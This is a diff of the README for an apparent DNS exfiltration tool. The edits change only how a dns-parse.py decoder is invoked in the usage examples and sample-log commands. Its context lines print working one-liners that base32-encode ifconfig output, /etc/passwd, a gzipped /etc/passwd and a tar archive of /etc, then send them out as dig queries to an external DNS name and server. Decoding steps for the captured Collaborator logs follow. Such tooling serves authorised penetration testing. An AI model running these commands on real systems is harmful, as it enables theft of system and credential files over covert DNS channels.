@@ -45,7 +45,7 @@ ifconfig | base32 -w 63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Serv
 Decode the output:
 
 ```
-./dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d
+dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d
 ```
 
 ### Exfiltrate a file:
@@ -57,7 +57,7 @@ base32 -w 63 < /etc/passwd | tr -d = | while read a; do dig $a.<DNS Name>.<DNS S
 Decode the file:
 
 ```
-./dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d
+dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d
 ```
 
 ### Exfiltrate a compressed file:
@@ -69,7 +69,7 @@ gzip - < /etc/passwd | base32 -w 63 | tr -d = | while read a; do dig $a.<DNS Nam
 Decode/unzip the file:
 
 ```
-./dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d | zcat
+dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d | zcat
 ```
 
 ### Exfiltrate a compressed tar archive of a directory:
@@ -83,7 +83,7 @@ tar czf - /etc | base32 -w 63 | tr -d = | while read a; do dig $a.<DNS Name>.<DN
 Decode/save the tar archive:
 
 ```
-./dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d > exfiltrated.tgz
+dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d > exfiltrated.tgz
 ```
 
 ## Sample Logs
@@ -91,17 +91,17 @@ Decode/save the tar archive:
 [collaborator1.log](collaborator1.log) (STDOUT exfiltration):
 
 ```
-/dns-parse.py qysipx9bbnhv0u5ez2dkmzuh68cy0n collaborator1.log | base32 -d
+dns-parse.py qysipx9bbnhv0u5ez2dkmzuh68cy0n collaborator1.log | base32 -d
 ```
 
 [collaborator2.log](collaborator2.log) (/etc/passwd exfiltration):
 
 ```
-/dns-parse.py 165cmzb1cu1m3wso0k1k3udr7id91y collaborator2.log | base32 -d 
+dns-parse.py 165cmzb1cu1m3wso0k1k3udr7id91y collaborator2.log | base32 -d 
 ```
 
 [collaborator3.log](collaborator3.log) (gzipped /etc/passwd exfiltration):
 
 ```
-/dns-parse.py l9vn8f4xr94q4f8j3t6ba8i5bwhm5b collaborator3.log | base32 -d | zcat
+dns-parse.py l9vn8f4xr94q4f8j3t6ba8i5bwhm5b collaborator3.log | base32 -d | zcat
 ```
